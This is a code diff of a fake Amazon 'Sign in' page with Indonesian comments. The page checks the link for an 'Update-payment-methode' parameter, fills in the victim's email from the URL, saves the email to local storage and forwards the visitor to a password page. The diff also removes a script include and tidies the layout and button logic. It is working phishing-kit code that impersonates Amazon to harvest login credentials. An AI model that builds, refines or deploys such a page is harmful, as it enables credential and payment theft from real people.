@@ -4,11 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Amazon — Sign In</title>
-    <script src="negara.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
         body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px 20px; }
-        .logo { margin: 0px 0 5px; text-align: center; }
+        .logo { margin: 10px 0 25px; text-align: center; }
         .logo img { height: 60px; }
         .kotak { width: 100%; max-width: 348px; padding: 20px 26px; border: 1px solid #ddd; border-radius: 8px; background: #fff; }
         h1 { font-size: 28px; font-weight: 400; margin-bottom: 15px; }
@@ -37,11 +36,15 @@
         <h1>Sign in or create account</h1>
         <label for="email">Enter mobile number or email</label>
         <input type="text" id="email" class="input">
-            <p id="pesanLink" class="pesan-merah">
+        <p id="pesanKosong" class="pesan-merah">
             <span class="ikon-bulat">!</span>
             Enter your mobile number or email
         </p>
-        <button id="lanjut" class="tombol">Continue</button>
+        <p id="pesanLink" class="pesan-merah">
+            <span class="ikon-bulat">!</span>
+            Enter your mobile number or email
+        </p>
+        <button type="button" id="lanjut" class="tombol">Continue</button>
         <p class="syarat">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
         <p class="bantuan"><a href="#">Need help?</a></p>
         <div class="bisnis">
@@ -59,7 +62,7 @@ const paramNama = 'Update-payment-methode';
 const queryStr = window.location.search.substring(1);
 const validParam = queryStr.includes(paramNama);
 
-// Ambil email dari link jika ada
+// Isi email otomatis dari link
 const cocok = queryStr.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
 if (cocok) document.getElementById('email').value = cocok[0];
 
@@ -75,32 +78,32 @@ emailInput.addEventListener('input', () => {
     pesanLink.style.display = 'none';
 });
 
-// Fungsi klik tombol
-tombolLanjut.addEventListener('click', () => {
+// Klik tombol — FUNGSI UTAMA
+tombolLanjut.onclick = function() {
     const isiEmail = emailInput.value.trim();
     
-    // Sembunyikan semua pesan dulu
+    // Reset pesan
     pesanKosong.style.display = 'none';
     pesanLink.style.display = 'none';
     emailInput.classList.remove('salah');
     
-    // Cek akses melalui parameter
+    // Cek parameter link
     if (!validParam) {
         pesanLink.style.display = 'flex';
         return;
     }
     
-    // Cek kolom tidak boleh kosong
+    // Cek kolom kosong
     if (!isiEmail) {
         emailInput.classList.add('salah');
         pesanKosong.style.display = 'flex';
         return;
     }
     
-    // ✅ Semua benar → simpan & lanjut ke password.html
+    // ✅ BERHASIL — Simpan & Pindah Halaman
     localStorage.setItem('email_pengguna', isiEmail);
     window.location.href = 'password.html';
-});
+};
 </script>
 </body>
 </html>
